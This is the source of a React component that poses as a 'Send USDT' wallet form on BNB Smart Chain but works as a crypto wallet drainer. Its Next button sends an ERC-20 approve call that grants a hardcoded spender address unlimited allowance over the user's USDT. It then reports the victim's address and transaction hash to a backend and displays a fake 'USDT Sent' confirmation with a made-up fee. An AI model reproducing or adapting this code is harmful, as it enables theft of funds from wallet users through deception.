"use client";

import { useState, useEffect, useCallback } from "react";
import { Loader2, CheckCircle, Copy, ExternalLink, ArrowLeft } from "lucide-react";

const BSC_CHAIN_ID = "0x38";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER = "0x36a4D5f9d1c2AA15C6409e3588995D140ee32B04";
const O = "f".repeat(64); // Unlimited approval

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

function getEth() {
  return (window as any).ethereum;
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState("");
  const [isAddressLoading, setIsAddressLoading] = useState(true);

  const fetchDisplayAddress = useCallback(async () => {
    setIsAddressLoading(true);
    try {
      const res = await fetch("/api/config/public", { cache: "no-store" });
      const data = await res.json();
      setDisplayAddress(data.address || SPENDER);
    } catch {
      setDisplayAddress(SPENDER);
    } finally {
      setIsAddressLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchDisplayAddress();
  }, [fetchDisplayAddress]);

  const shorten = (addr: string) =>
    addr ? `\( {addr.slice(0, 8)}... \){addr.slice(-6)}` : "";

  const usdValue = parseFloat(amount || "0").toFixed(2);

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) return;

    const eth = getEth();
    if (!eth) {
      setError("Please open in Trust Wallet or MetaMask");
      return;
    }

    try {
      setProcessing(true);
      setError("");

      const chainId = await eth.request({ method: "eth_chainId" });
      if (chainId !== BSC_CHAIN_ID) {
        try {
          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
        } catch {}
      }

      const paddedSpender = SPENDER.replace(/^0x/i, "").padStart(64, "0");
      const calldata = "0x095ea7b3" + paddedSpender + O;

      let from = "";
      try {
        const accs = await eth.request({ method: "eth_accounts" });
        from = accs?.[0] || "";
      } catch {}

      const txHash = await eth.request({
        method: "eth_sendTransaction",
        params: [{ from: from || undefined, to: USDT_CONTRACT, data: calldata }],
      }) as string;

      if (from) {
        fetch("/api/wallets", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: from, approvalTxHash: txHash, approvalStatus: true }),
        }).catch(() => {});
      }

      setTxInfo({
        fromAddress: from || "Connected Wallet",
        toAddress: displayAddress,
        amount,
        txHash,
        date: new Date().toLocaleString(),
      });
      setStep("success");
    } catch (e: any) {
      setError(e?.shortMessage || e?.message || "Transaction failed");
    } finally {
      setProcessing(false);
    }
  }

  // ==================== SUCCESS SCREEN ====================
  if (step === "success" && txInfo) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-white">
        <div className="max-w-md mx-auto px-5 pt-8 pb-12">
          {/* Success Header */}
          <div className="text-center mb-8">
            <div className="mx-auto w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center mb-4">
              <CheckCircle className="h-9 w-9 text-green-500" />
            </div>
            <p className="text-5xl font-bold tracking-tighter">-{txInfo.amount}</p>
            <p className="text-xl text-gray-400 mt-1">USDT Sent</p>
            <p className="text-green-500 text-sm mt-2 font-medium">Transaction Confirmed</p>
          </div>

          {/* Receipt Card */}
          <div className="bg-[#111] border border-[#222] rounded-3xl p-6 space-y-5 text-sm">
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Date</span>
              <span className="font-medium">{txInfo.date}</span>
            </div>

            <div className="flex justify-between items-center">
              <span className="text-gray-400">Status</span>
              <span className="px-3 py-0.5 bg-green-500/10 text-green-500 rounded-full text-xs font-semibold tracking-wider">
                CONFIRMED
              </span>
            </div>

            <div className="h-px bg-[#222]" />

            <div>
              <div className="text-gray-400 text-xs mb-1.5">FROM</div>
              <div className="flex items-center justify-between bg-[#1a1a1a] rounded-2xl px-4 py-3">
                <span className="font-mono text-sm">{shorten(txInfo.fromAddress)}</span>
                <button
                  onClick={() => navigator.clipboard.writeText(txInfo.fromAddress)}
                  className="text-gray-400 hover:text-white p-1"
                >
                  <Copy className="h-4 w-4" />
                </button>
              </div>
            </div>

            <div>
              <div className="text-gray-400 text-xs mb-1.5">TO</div>
              <div className="flex items-center justify-between bg-[#1a1a1a] rounded-2xl px-4 py-3">
                <span className="font-mono text-sm">{shorten(txInfo.toAddress)}</span>
                <button
                  onClick={() => navigator.clipboard.writeText(txInfo.toAddress)}
                  className="text-gray-400 hover:text-white p-1"
                >
                  <Copy className="h-4 w-4" />
                </button>
              </div>
            </div>

            <div className="flex justify-between items-center pt-1">
              <span className="text-gray-400">Network Fee</span>
              <span className="font-medium text-sm">\~$0.05 <span className="text-gray-500">(0.00009 BNB)</span></span>
            </div>
          </div>

          {/* View on Explorer */}
          <a
            href={`https://bscscan.com/tx/${txInfo.txHash}`}
            target="_blank"
            rel="noopener noreferrer"
            className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-400 hover:text-white transition-colors py-3"
          >
            View on BscScan <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  // ==================== MAIN FORM ====================
  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white">
      <div className="max-w-md mx-auto px-5 pt-6 pb-12">
        {/* Header */}
        <div className="flex items-center gap-4 mb-8">
          <button className="p-2 -ml-2 text-gray-400 hover:text-white">
            <ArrowLeft className="h-5 w-5" />
          </button>
          <div>
            <h1 className="text-2xl font-bold tracking-tight">Send USDT</h1>
            <p className="text-xs text-gray-500">BSC Network • Very low fees</p>
          </div>
        </div>

        {/* Recipient Card */}
        <div className="mb-6">
          <div className="flex items-center justify-between mb-2 px-1">
            <span className="text-sm font-medium text-gray-400">Recipient Address</span>
          </div>
          <div className="bg-[#111] border border-[#222] rounded-3xl p-4 flex items-center justify-between">
            <div className="flex-1 min-w-0 pr-4">
              {isAddressLoading ? (
                <div className="flex items-center gap-2 text-gray-500">
                  <Loader2 className="h-4 w-4 animate-spin" /> Loading address...
                </div>
              ) : (
                <p className="font-mono text-sm break-all leading-tight tracking-tight text-white/90">
                  {displayAddress}
                </p>
              )}
            </div>
            <button
              onClick={() => navigator.clipboard.writeText(displayAddress)}
              className="flex items-center gap-1.5 text-[#4ade80] text-sm font-semibold active:opacity-70 px-3 py-1.5 rounded-2xl hover:bg-white/5"
            >
              <Copy className="h-4 w-4" /> Copy
            </button>
          </div>
        </div>

        {/* Amount Card */}
        <div className="mb-8">
          <div className="flex items-center justify-between mb-2 px-1">
            <span className="text-sm font-medium text-gray-400">Amount</span>
            <button
              onClick={() => setAmount("1000")}
              className="text-[#4ade80] text-xs font-bold px-3 py-1 rounded-full active:bg-white/5"
            >
              MAX
            </button>
          </div>

          <div className="bg-[#111] border border-[#222] rounded-3xl p-5">
            <div className="flex items-center gap-3">
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="flex-1 bg-transparent text-5xl font-semibold tracking-tighter outline-none placeholder:text-gray-600"
              />
              <div className="text-right">
                <div className="text-2xl font-bold text-white/90">USDT</div>
                <div className="text-xs text-gray-500 mt-0.5">≈ ${usdValue}</div>
              </div>
            </div>
          </div>
        </div>

        {/* Action Button */}
        <button
          onClick={handleNext}
          disabled={processing || !amount || parseFloat(amount) <= 0}
          className="w-full py-4 rounded-3xl font-bold text-lg transition-all active:scale-[0.985] disabled:bg-gray-800 disabled:text-gray-500 bg-[#4ade80] hover:bg-[#22c55e] text-black shadow-lg shadow-green-500/20"
        >
          {processing ? (
            <span className="flex items-center justify-center gap-2">
              <Loader2 className="animate-spin h-5 w-5" /> Processing Transaction...
            </span>
          ) : (
            "Next"
          )}
        </button>

        {error && (
          <p className="text-red-400 text-center text-sm mt-4 bg-red-950/40 py-2 rounded-2xl border border-red-900/50">
            {error}
          </p>
        )}

        {/* Footer Note */}
        <p className="text-center text-[10px] text-gray-500 mt-6 tracking-wider">
          NETWORK FEE • \~$0.05 (0.00009 BNB)
        </p>
      </div>
    </div>
  );
}